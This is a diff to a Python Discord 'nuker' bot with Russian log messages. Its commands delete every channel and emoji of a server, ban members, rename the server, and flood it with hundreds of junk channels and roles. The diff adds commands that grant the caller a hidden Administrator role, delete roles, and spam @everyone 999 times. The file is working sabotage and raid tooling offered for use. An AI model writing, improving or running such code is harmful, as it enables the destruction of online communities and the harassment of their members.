@@ -2,8 +2,14 @@ import discord, os, sys, random, string, requests
 from discord.ext import commands
 from discord import Permissions
 from colorama import Fore, init
-os.system('clear')
+from os import system, name
 init()
+
+if name == "nt":
+        _ = system("cls")
+
+else:
+        _ = system("clear")
 
 intents = discord.Intents.default()
 intents.members = True
@@ -25,13 +31,18 @@ async def on_ready():
 
 @client.command()
 async def lol(ctx):
-    await ctx.guild.edit(name="Осторожно! Зачищено")
+    await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
+    await ctx.guild.edit(name="Концерт фейса")
     print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
     
     print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
     for channel in ctx.guild.channels:
-        await channel.delete()
-        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
+        try:
+            await channel.delete()
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
+        except:
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}")
+            continue
     print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
     
     print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
@@ -72,22 +83,55 @@ async def lol(ctx):
             print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
         except:
             print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
+            continue
     print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")
     
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
-    for b in range(199):
+    for b in range(200):
         await ctx.guild.create_text_channel("CRASH9D")
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")
 
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам ролями")
-    for a in range(99):
+    for a in range(200):
         await ctx.guild.create_role(name="BABABOOEY")
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")
     
     print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
+   
+@client.command()
+async def upme(ctx, pos: int):
+    try:
+        await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
+        role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
+        await role.edit(position=pos, reason="Админ идиот")
+        await ctx.message.author.add_roles(role)
+        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
+    except:
+        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
+
+@client.command()
+async def delroles(ctx):
+  roles = ctx.guild.roles
+  roles.pop(0)
+  for role in roles:
+      if ctx.guild.me.roles[-1] > role:
+          await role.delete()
+          print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
+      else:
+          break
+  print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")
+
+@client.command()
+async def spam(ctx):
+    await ctx.message.delete()
+    for s in range(999):
+        await ctx.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
+        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим...")
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Заспамили!")
     
+
 
 try:
     client.run('токен сюда')
